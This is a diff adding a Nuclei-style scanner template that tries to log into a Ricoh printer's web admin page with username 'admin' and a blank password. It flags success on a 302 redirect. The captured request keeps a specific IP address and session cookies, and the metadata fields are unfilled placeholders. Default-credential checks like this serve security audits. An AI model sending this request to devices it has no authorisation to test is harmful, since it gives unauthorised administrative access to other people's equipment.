@@ -1,0 +1,44 @@
+id: custom-ricoh-admin-creds
+
+info:
+  name: custom-ricoh-admin-creds
+  author: 8aipuzur3y
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+
+requests:
+  - raw:
+      - |-
+        POST /web/guest/en/websys/webArch/login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: risessionid=023905461614193; cookieOnOffChecker=on; wimsesid=--
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 80
+        Origin: https://130.36.45.36
+        Referer: https://130.36.45.36/web/guest/en/websys/webArch/authForm.cgi
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+
+        wimToken=162556750&userid_work=&userid=YWRtaW4%3D&password_work=&password=&open=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'Location: /web/entry/en/websys/webArch/mainFrame.cgi'
+      - type: status
+        status:
+          - 302
